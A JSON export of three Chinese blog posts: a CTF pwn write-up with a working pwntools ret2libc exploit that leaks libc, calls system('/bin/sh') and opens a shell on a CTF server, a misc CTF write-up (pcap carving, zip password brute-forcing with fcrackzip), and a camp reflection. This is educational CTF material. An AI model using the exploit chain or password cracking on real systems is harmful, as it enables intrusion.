[{"title":"XCTF-PWN","date":"2019-08-15T14:34:34.000Z","path":"2019/08/15/XCTF-PWN/","text":"level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, &quot;Input:\\n&quot;, 7u); return read(0, &amp;buf, 256u);&#125; exp: 1234567891011121314151617181920212223242526272829303132from pwn import *from LibcSearcher import *context.log_level='debug'# payload = cyclic(0x100)io = process('./level3')io = remote('111.198.29.45',45330)elf = ELF('./level3')write_plt = elf.plt['write']write_got = elf.got['write']main_addr = 0x08048484# gdb.attach(io)payload1 = 0x8c*'a'+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil('Input:\\n')# pause()io.sendline(payload1)write = u32(io.recv(4))info('write:'+hex(write))obj = LibcSearcher(\"write\", write)system = write + obj.dump(\"system\") - obj.dump(\"write\") #system offsetbin_sh = write + obj.dump(\"str_bin_sh\") - obj.dump(\"write\") #/bin/sh offsetinfo('system:'+hex(system))info('/bin/sh:'+hex(bin_sh))payload2 = 0x8c*'b'+p32(system)+p32(main_addr)+p32(bin_sh)io.recvuntil('Input:\\n')# pause()io.sendline(payload2)io.interactive() 调试技巧: 在read处按下123456断点下在 ```0x08048482``` 处```assembly.text:08048482 leave.text:08048483 retn python里加上调试语句，python脚本运行时会自动打开123```python# gdb.attach(io) 但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让12345```pythonio.recvuntil(&apos;Input:\\n&apos;)# pause()io.sendline(payload1) 123io.recvuntil('Input:\\n')# pause()io.sendline(payload2) 在填充至返回地址的时候，可以用gdb跟踪到ret指令处，此时查看$esp寄存器的内容，可以检查自己的地址是否填正确。","tags":[]},{"title":"xman-misc","date":"2019-08-12T10:14:10.000Z","path":"2019/08/12/xman-misc/","text":"cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。 ceph1 追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面 ceph2 linux下使用tcpxtract分离，其中一张图片即为flag 1tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap Erik-Baleog-and-Olaf压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同 1compare hint.png stego100.png -compose src diff.png hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可 Miscellaneous-300一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压 12345678910111213import os,sys,zipfileoriginal_file='12475.zip'while True: original_file = zipfile.ZipFile(original_file) if 'zip' in original_file.namelist()[0]: inner_zipfile = original_file.namelist()[0] original_file_password = inner_zipfile[:inner_zipfile.find('.')] original_file.setpassword(original_file_password) original_file.extractall() os.remove(original_file.filename) original_file = inner_zipfile else: break 到最后一层12475.zip无法解压了，这个时候进行爆破 1fcrackzip -u -l 1-6 -c 'a1' 12475.zip -u：使用unzip解压 -l：后面接长度范围 -c：后接字符，a为所有小写字母，1是数字[0-9] 小小的PDF打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容 1foremost -i 2333.pdf -o test foremost是基于文件头及尾部信息恢复文件的工具。 Refference https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/ https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300","tags":[]},{"title":"XMAN-2019-福州营","date":"2019-08-11T09:55:59.000Z","path":"2019/08/11/xman/","text":"该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。","tags":[]}]